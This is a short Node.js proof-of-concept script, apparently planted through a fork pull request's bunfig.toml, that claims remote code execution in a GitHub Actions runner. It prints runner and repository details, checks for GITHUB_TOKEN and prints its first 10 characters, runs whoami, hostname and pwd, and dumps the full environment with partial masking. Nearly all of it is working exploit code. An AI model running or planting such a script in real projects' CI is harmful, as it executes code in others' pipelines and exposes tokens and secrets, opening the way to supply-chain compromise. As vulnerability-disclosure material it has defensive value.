const fs = require('fs');
const https = require('https');

console.log("===========================================");
console.log("🚨 RCE FROM FORK PR via bunfig.toml 🚨");
console.log("===========================================");
console.log("Timestamp:", new Date().toISOString());
console.log("CWD:", process.cwd());
console.log("GITHUB_REPOSITORY:", process.env.GITHUB_REPOSITORY);
console.log("GITHUB_ACTOR:", process.env.GITHUB_ACTOR);
console.log("GITHUB_EVENT_NAME:", process.env.GITHUB_EVENT_NAME);
console.log("GITHUB_RUN_ID:", process.env.GITHUB_RUN_ID);
console.log("RUNNER_NAME:", process.env.RUNNER_NAME);
console.log("RUNNER_OS:", process.env.RUNNER_OS);

// Show GITHUB_TOKEN (will be masked but proves we have access)
const token = process.env.GITHUB_TOKEN || "not-set";
console.log("GITHUB_TOKEN available:", token !== "not-set");
console.log("GITHUB_TOKEN (first 10 chars):", token.substring(0, 10) + "...");

// Prove we can execute commands
const { execSync } = require('child_process');
console.log("\n=== System Info ===");
console.log("whoami:", execSync('whoami').toString().trim());
console.log("hostname:", execSync('hostname').toString().trim());
console.log("pwd:", execSync('pwd').toString().trim());

// List environment (proof of access)
console.log("\n=== Full Environment ===");
Object.keys(process.env).sort().forEach(key => {
  let val = process.env[key];
  // Mask sensitive values
  if (key.includes('TOKEN') || key.includes('SECRET') || key.includes('KEY')) {
    val = val ? val.substring(0, 4) + '***MASKED***' : 'undefined';
  }
  console.log(key + "=" + val);
});

console.log("\n===========================================");
console.log("🚨 This executed BEFORE any auth checks! 🚨");
console.log("===========================================");

// Don't block the action from continuing (for visibility)
// process.exit(0);
